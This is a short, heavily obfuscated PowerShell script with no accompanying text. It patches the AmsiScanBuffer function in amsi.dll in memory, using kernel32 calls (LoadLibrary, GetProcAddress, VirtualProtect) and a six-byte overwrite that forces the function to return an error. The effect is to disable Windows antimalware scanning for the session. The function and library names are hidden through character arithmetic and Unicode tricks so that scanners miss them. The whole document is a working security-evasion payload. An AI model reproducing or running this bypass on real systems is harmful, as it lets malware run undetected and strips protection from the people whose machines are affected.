$K5OxpO = @"
using System;
using System.Runtime.InteropServices;
public class K5OxpO {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr uqr, string ByOSFGD6sG);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr JXx8zeuTksi9zQYssr0, UIntPtr jbC6o7VuIjN, uint YJnbBNBDDFFoNXOLNWem, out uint o1iIlL5l873d38ivW_D);
}
"@

Add-Type $K5OxpO

$bfaTMQKBP_t = [K5OxpO]::LoadLibrary("$([chaR](97)+[CHAR](64+45)+[CHar]([BYtE]0x73)+[ChaR](91+14)+[ChAr]([BytE]0x2e)+[cHAR](100)+[ChAr]([bYTE]0x6c)+[CHAr](108))")
$_oyfuQ = [K5OxpO]::GetProcAddress($bfaTMQKBP_t, "$(('Ámsì'+'Scàn'+'Bùff'+'êr').nORmAlIze([CHar](70+18-18)+[cHAR](111)+[cHAR]([BYTE]0x72)+[cHar](109+86-86)+[chAr](68)) -replace [chaR](92+58-58)+[char](112+8-8)+[cHaR]([BYTE]0x7b)+[chAR]([BYtE]0x4d)+[cHAr](110*11/11)+[chaR]([bytE]0x7d))")
$p = 0
[K5OxpO]::VirtualProtect($_oyfuQ, [uint32]5, 0x40, [ref]$p)
$MF3dYDEwHJhy8w = "0xB8"
$ZnrQxpaIAPiewFxlXRS = "0x57"
$dm_i1BqE9IoFGLE9 = "0x00"
$X8mE = "0x07"
$rVfaUvJxhaVkdG = "0x80"
$CPf_K5wNdPoYpIVSh = "0xC3"
$ocgj9X0OIdgWd = [Byte[]] ($MF3dYDEwHJhy8w,$ZnrQxpaIAPiewFxlXRS,$dm_i1BqE9IoFGLE9,$X8mE,+$rVfaUvJxhaVkdG,+$CPf_K5wNdPoYpIVSh)
[System.Runtime.InteropServices.Marshal]::Copy($ocgj9X0OIdgWd, 0, $_oyfuQ, 6)